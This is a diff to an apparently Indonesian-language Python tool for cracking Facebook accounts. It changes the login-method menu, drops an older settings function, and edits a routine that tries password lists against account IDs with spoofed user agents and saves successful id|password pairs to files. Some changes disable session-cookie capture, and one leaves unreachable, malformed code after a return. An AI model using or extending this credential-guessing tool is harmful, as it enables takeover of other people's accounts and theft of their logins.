@@ -1189,7 +1189,9 @@ def setting():
     # Input untuk metode login
     hc = console.input(f" {H2}• {P2}Masukan : ").strip()
     if hc in ["1", "01"]:
-        method.append("validatev1")
+        method.append("mbasicKU")
+        metcepat()
+        return None
     #elif hc in ["2", "02"]:
         #method.append("validatev2")
     #elif hc in ["3", "03"]:
@@ -1197,7 +1199,9 @@ def setting():
     #elif hc in ["4", "04"]:
         #method.append("mbasic")
     else:
-        method.append("validatev1")  # Default metode
+        method.append("mbasicKU")
+        metcepat()
+        return None  # Default metode
 
     # Pengaturan User-Agent
     Console().print(Panel(
@@ -1228,58 +1232,7 @@ def setting():
         metcepat()
     else:
         metcepat()  # Default ke metode cepat
-	    
-def settinggg():
-    Console().print(Panel(f"{P2}[{color_text}01{P2}] Crack akun Old [/]\n{P2}[{color_text}02{P2}] Crack Akun New [/]\n{P2}[{color_text}03{P2}] Crack Akun Random [[bold green]Recommended[bold white]][/]",title="[bold green] %s " % (len(id)),width=60,style=f"{color_panel}"))
-    hu = console.input(f" {H2}• {P2}Masukan : ")
-    if hu in ["1", "01"]:
-        for tua in sorted(id):
-            id2.append(tua)
-    elif hu in ["2", "02"]:
-        muda = []
-        for bacot in sorted(id):
-            muda.append(bacot)
-        bcm = len(muda)
-        bcmi = bcm - 1
-        for xmud in range(bcm):
-            id2.append(muda[bcmi])
-            bcmi -= 1
-    elif hu in ["3", "03"]:
-        for bacot in id:
-            xx = random.randint(0, len(id2))
-            id2.insert(xx, bacot)
-    else:
-        print(" [+] Pilih Yang Bener Sayang ")
-        return setting
-    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]MBASIC WORK[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
-    hc = console.input(f" {H2}• {P2}Masukan : ")
-    if hc in ["1", "01"]:
-        method.append("validatev1")
-    #elif hc in ["2", "02"]:
-        #method.append("validatev2")
-    #elif hc in ["3", "03"]:
-        #method.append("reguler")
-    #elif hc in ["4", "04"]:
-        #method.append("mbasic")
-    else:
-        method.append("validatev1")
-    Console().print(Panel(f"[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T",title=f"[bold green]Setting User-Agent",width=60,style=f"{color_panel}"))
-    uatambah = console.input(f" {H2}• {P2}Masukan : ")
-    if uatambah in ["y", "Ya", "ya", "Y"]:
-        ualuh.append("ya")
-        bzer = console.input(f" {H2}• {P2}Masukan UA : ")
-        ualu.append(bzer)
-    else:
-        ualuh.append("tidak")
-    Console().print(Panel(f"{P2}[{color_text}01{P2}] metode Slow {H2}[Recomended]{P2}\n{P2}[{color_text}02{P2}] method cepat{P2}",width=60,style=f"{color_panel}"))
-    hc = console.input(f" {H2}• {P2}Masukan : ")
-    if hc in ["1", "01"]:
-        metslow()
-    elif hc in ["2", "02"]:
-        metcepat()
-    else:
-        metcepat()
-
+	
 
 # -------------------[ CRACK-SLOW ]------------#
 def metslow():
@@ -1474,7 +1427,7 @@ def mbasic(idf,pwv):
 	ua = random.choice(baru)
 	cn = random.randint(60, 99)
 	ses = requests.Session()
-	prog.update(des,description=f"{h}b-graph new{P2}{idf} [bold blue]{loop}/{len(id)} OK-:[bold cyan]{ok}[/] CP-:[bold gold]{cp}[/]")
+	prog.update(des,description=f"{h} [b-graph new] {P2}{idf} [bold blue]{loop}/{len(id)} OK-:[bold cyan]{ok}[/] CP-:[bold gold]{cp}[/]")
 	prog.advance(des)
 	for pw in pwv:
 		try:
@@ -1493,12 +1446,12 @@ def mbasic(idf,pwv):
 				break
 			elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
 				ok+=1
-				cokii = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
-				Fanky = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
-				cookie = f'''sb={Fanky};{cokii}'''
+				#cokii = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
+				#Fanky = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
+				#cookie = f'''sb={Fanky};{cokii}'''
 				tree = Tree(f"  ")
 				tree.add(f"[green]{idf}").add(f"[green]{pw}").add(f"[green]{ua}\n")
-				tree.add(f"[green]{kuki}\n")
+				#tree.add(f"[green]{kuki}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1509,6 +1462,12 @@ def mbasic(idf,pwv):
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
+	return None
+	if requests.exceptions.ConnectionError:
+		'Keep-Alive'
+		mbasicKU(idf,pw)
+		return None
+
 
 
 
